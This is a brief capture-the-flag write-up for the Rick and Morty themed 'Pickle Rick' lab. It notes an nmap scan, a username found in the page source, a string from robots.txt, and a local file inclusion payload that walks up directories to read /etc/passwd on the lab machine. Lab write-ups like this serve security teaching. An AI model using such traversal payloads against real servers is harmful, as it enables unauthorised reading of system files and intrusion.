# Pickle Rick
A Rick and Morty CTF. Help turn Rick back into a human!

Machine ip
```
export IP=10.10.143.147
```

- Performing an nmap scan as my first line of movement.

- I found some pretty interesting things in the webpage's source
```
Username: R1ckRul3s
```

- found some interesting thing in the robots.txt file also
```
Wubbalubbadubdub
```

- I am using the local file inclusion attack style to gather info about the directory structure of the server. I am going back many times to see if i can access the /etc/passwd since the server is running linux.
```
http://$IP:80/?page=../../../../../../../../../../../etc/passwd
```
